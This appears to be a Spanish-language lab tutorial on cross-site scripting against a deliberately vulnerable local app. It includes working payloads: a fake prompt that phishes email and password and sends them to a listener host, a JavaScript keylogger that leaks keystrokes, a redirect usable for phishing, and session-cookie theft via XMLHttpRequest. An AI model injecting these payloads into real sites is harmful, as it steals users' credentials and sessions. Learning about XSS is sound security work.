Esta vulnerabilidad permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales. Para practicar vamos a utilizar el siguiente repositorio:
![[Pasted image 20240612235555.png]]

Nos clonamos el repositorio y entramos en la siguiente ruta:
![[Pasted image 20240612235600.png]]

Hacemos un make install y nos lo monta todo por el puerto 10007:
![[Pasted image 20240612235617.png]]

Y accedemos a este panel:
![[Pasted image 20240612235629.png]]

Por lo que nos creamos dos cuentas, el usuario mario con contraseña password1 y el usuario penguin con la contraseña 123123:
![[Pasted image 20240612235635.png]]

![[Pasted image 20240612235638.png]]

## XSS REFLECTED - HTML INJECTION

Una vez estamos dentro, tenemos la posibilidad de crear una nueva entrada en la web para que sea publicada:
![[Pasted image 20240612235816.png]]

Y por ejemplo si publicamos algo se queda reflejado:
![[Pasted image 20240612235819.png]]

Ahora vamos a crear otra nota tratando de inyectar código html probando por ejemplo con la etiqueta h1:
![[Pasted image 20240612235824.png]]

Y vemos que se aplica esta etiqueta:
![[Pasted image 20240613000004.png]]

## Scripts de JavaScript
Viendo lo anterior, podemos inyectar código javascript para establecer que la página web víctima ejecute cierto código y alterar así su comportamiento:

![[Pasted image 20240613000011.png]]

Y si ejecutamos esto, se nos abrirá un pop-up:
![[Pasted image 20240613000020.png]]

![[Pasted image 20240613000024.png]]
## INGENIERÍA SOCIAL EN XSS
Podemos inyectar código javascript que solicite al usuario víctima que inserte un correo, a través de este código:
```javascript
<script>
        var email = prompt("Introduce tu email: ");

        if (email == null || email == ""){
         alert("Hay que poner un correo válido");
        } else {
         fetch("http://192.168.0.57/" + email);
        }
</script>
```

![[Pasted image 20240613000031.png]]

Y ahora si accedemos al post, nos pide un email:
![[Pasted image 20240613000038.png]]

Y si nos ponemos en escucha con netcat, habremos recibido el correo del usuario:
![[Pasted image 20240613000043.png]]

No obstante, si quisiéramos también pedir la contraseña al usuario, podríamos usar este código:
```javascript
<script>
        var email = prompt("Introduce tu email: ");
        var password = prompt("Introduce tu contraseña: ");

        if (email == null || email == ""){
         alert("Hay que poner un correo válido");
        } else {
         fetch("http://192.168.0.57/" + email + password);
        }
</script>
```
Y nos pide el correo y después la contraseña:
![[Pasted image 20240613000051.png]]


![[Pasted image 20240613000055.png]]
## XSS PERSISTENTE

El payload se almacena en las bases de datos de la aplicación por medio de entradas que permanecen siempre en la página, como comentarios, foros, etc:

## Keylogger con javascript

Si queremos crear un keylogger para ir capturando las pulsaciones del teclado de un usuario, lo haría con el siguiente código
```javascript
<script>
        var k = "";
        document.onkeypress = function(e){
         e = e || window.event;
         k += e.key;
         var i = new Image();
         i.src = "http://192.168.0.32/" + k;
};
</script>
```

![[Pasted image 20240613000105.png]]

Y ahora si vamos al post llamado keylogger y escribimos en alguna parte, veremos como todo lo que se escriba se habrá registrado:
![[Pasted image 20240613000112.png]]

## Redirigir al Usuario a otra Web
También podemos redirigir al usuario a otra web de forma automática utilizando este código:
```javascript
<script>
window.location.href="https://google.es";
</script>
```

![[Pasted image 20240613000123.png]]

Y ahora si hacemos clic a este post publicado, nos llevará a google (o a la página phising correspondiente):
![[Pasted image 20240613000128.png]]

![[Pasted image 20240613000131.png]]
## Capturar Cookie de Sesión con XSS
Podemos crear un código javascript para que nos muestre la cookie de sesión del usuario. Por lo que primero tenemos que comprobar que dentro de los ajustes de la web, la cookie no se encuentre protegida, ya que debe aparecer de esta forma:

![[Pasted image 20240613000142.png]]

Y después tenemos que poner este código:
```javascript
<script>
   alert(document.cookie);
</script>
```

![[Pasted image 20240613000151.png]]

Y vemos la cookie de sesión (aunque de momento solo se le muestra al mismo usuario):
![[Pasted image 20240613000157.png]]

Para poder robar la cookie de inicio de sesión del usuario, necesitaremos primeroe este código:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.19/?cookie=' + document.cookie);
request.send();
```

![[Pasted image 20240613000201.png]]

Y con python si nos ponemos en escucha deberíamos de recibir la cookie de sesión:

![[Pasted image 20240613000209.png]]